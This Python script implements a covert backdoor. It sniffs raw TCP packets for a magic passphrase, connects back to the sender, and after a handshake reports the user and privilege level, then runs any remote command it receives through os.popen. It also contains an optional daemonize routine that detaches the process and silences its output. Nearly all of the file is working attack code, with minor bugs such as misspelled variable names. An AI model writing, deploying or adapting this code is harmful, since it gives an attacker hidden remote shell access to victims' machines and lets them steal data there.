#!/usr/bin/python3

"""
pip3 install scapy-python3
brew install libdnet
brew install libpcap
"""
import socket, os, sys
import getpass
import platform
import subprocess
from struct import *

MAXSIZE = 65535
BUFSIZE = 1024

def BackdoorSniffer():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    while True:
        packet = sock.recvfrom(MAXSIZE)
        packet = packet[0]
        ipHeader = packet[0:20]
        iph = unpack('!BBHHHBBH4s4s', ipHeader)
        srcAddr = socket.inet_ntoa(iph[8])
        dstAddr = socket.inet_ntoa(iph[9])
        versionIhl = iph[0]
        version = versionIhl >> 4
        ihl = versionIhl & 0xF
        iphLength = ihl * 4
        tcpHeader = packet[iphLength:iphLength+20]
        tcph = unpack('!HHLLBBHHH', tcpHeader)
        srcPort = tcph[0]
        dstPort = tcph[1]
        offsetReserved = tcph[4]
        tcphLength = offsetReserved >> 4
        headerSize = iphLength + tcphLength
        dataSize = len(packet) - headerSize
        print(version, iphLength, srcPort, dstPort, tcphLength, headerSize)
        # get data from the packet
        data = packet[headerSize:]
        try:
            if type(data) == bytes:
                data = data.decode("utf-8")
            if data == "passphrase1":
                if type(srcAddr) == bytes:
                    srcAddr = srcAddr.decode("utf-8")
                if type(srcPort) == bytes:
                    srcPort = srcPort.decode("urf-8")
                print(srcAddr, srcPort, dstAddr, dstPort)
                return srcAddr, srcPort, dstAddr, dstPort
        except:
            pass

def BackdoorInit():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    dstAddr, dstPort, srcAddr, srcPort = BackdoorSniffer()
    try:
        sock.bind((srcAddr, srcPort))
        sock.connect((dstAddr, dstPort))
    except:
        return None
    cmd = sock.recv(BUFSIZE)
    if type(cmd) == bytes:
        cmd = cmd.decode("utf-8")
    if cmd.strip() == "passphrase2":
        sock.send(b"passphrase3")
        return sock
    else:
        return None

def BackdoorGetSystemInfo(sock):
    global gIsRoot
    cmd = sock.recv(BUFSIZE)
    prompt = []
    if type(cmd) == bytes:
        cmd = cmd.decode("utf-8")
    if cmd.strip() == "Report":
        process = subprocess.Popen(['whoami'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = process.communicate()
        user = out.strip().decode("utf-8")
        prompt.append(user+"@")
        prompt.append(platform.dist()[0]+":")
        separator = "$"
        if user == "root":
            separator = "#"
        prompt.append(separator)
        prompt = "".join(prompt)
        sock.send(str.encode(prompt))
    cmd = sock.recv(BUFSIZE)
    if type(cmd) == bytes:
        cmd = cmd.decode("utf-8")
    if cmd.strip() == "Location":
        proc = os.popen("pwd")
        location = ""
        for i in proc.readlines():
            localtion += i
        localtion = localtion.strip()
        sock.send(str.encode(location))
    return

def BackdoorCmd(sock, command):
    try:
        proc = os.popen(command)
        output = ""
        for i in proc.readlines():
            output += i
        output = output.strip()
        if output == "":
            output = "daemonnoreport"
        sock.send(str.encode(output))
    except Exception as err:
        print(err.args)
        sock.send(str.encode("Error : command '" + command + "' not found'"))

def BackdoorShell(sock):
    while True:
        try:
            cmd = sock.recv(BUFSIZE)
            if type(cmd) == bytes:
                cmd = cmd.decode("utf-8")
            if cmd.strip().split()[0] == "cd":
                os.chdir(cmd.strip("cd "))
                BackdoorCmd(sock, "pwd")
            elif cmd.strip().lower() == "exit":
                sock.send(b"exited")
                sock.close()
                break
            elif cmd.strip().lower() == "release":
                sock.send(b"released")
                sock.close()
                return False
            else:
                BackdoorCmd(sock, cmd)
        except Exception:
            sock.send(b"Error: An unexpected error has orrcured.")
    return True

def Backdoor():
    while True:
        sock = BackdoorInit()
        if sock == None:
            continue
        BackdoorGetSystemInfo(sock)
        if not BackdoorShell(sock):
            break
    return

def daemonize():
    stdin = '/dev/null'
    stdout = '/dev/null'
    stderr = '/dev/null'

    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0) # Exit parent process
    except OSError as e:
        print(e.args)
        sys.exit(1)
    # Decouple from parent environment
    os.chdir("/")
    os.umask(0)
    os.setsid()
    try:
        pid = os.fork( )
        if pid > 0:
            sys.exit(0) # Exit second parent
    except OSError as e:
        print(e.args)
        sys.exit(1)
    # The process is now daemonized, redirect standard file descriptors.
    for f in sys.stdout, sys.stderr:
        f.flush()
    si = open(stdin, 'r')
    so = open(stdout, 'a+')
    se = open(stderr, 'a+')
    os.dup2(si.fileno( ), sys.stdin.fileno( ))
    os.dup2(so.fileno( ), sys.stdout.fileno( ))
    os.dup2(se.fileno( ), sys.stderr.fileno( ))

    Backdoor()

def main():
    #daemonize()
    Backdoor()

if __name__ == '__main__':
    main()
